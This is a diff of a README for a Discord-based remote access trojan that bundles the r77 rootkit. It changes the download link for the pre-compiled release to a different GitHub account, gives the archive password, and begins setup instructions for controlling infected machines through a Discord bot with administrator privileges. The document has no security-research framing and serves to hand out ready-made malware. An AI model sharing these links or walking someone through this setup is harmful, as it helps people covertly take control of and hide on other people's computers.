@@ -17,7 +17,7 @@ This a modified verison of https://github.com/moom825/Discord-RAT-2.0
 The rootkit in the project was made by "bytecode77". The source of the rootkit can be found here: https://github.com/bytecode77/r77-rootkit
 
 ## **Downloads:**
-Pre-Compiled: https://github.com/Fa-llen/discord/releases/tag/discord
+Pre-Compiled: https://github.com/xssis57/Discord-Rat/releases/download/Discord-Rat/Release.zip
 Password: discord
 
 You will first need to register a bot with the Discord developer portal and then add the bot to the Discord server that you want to use to control the bot (make sure the bot has administrator privileges in the Discord server).
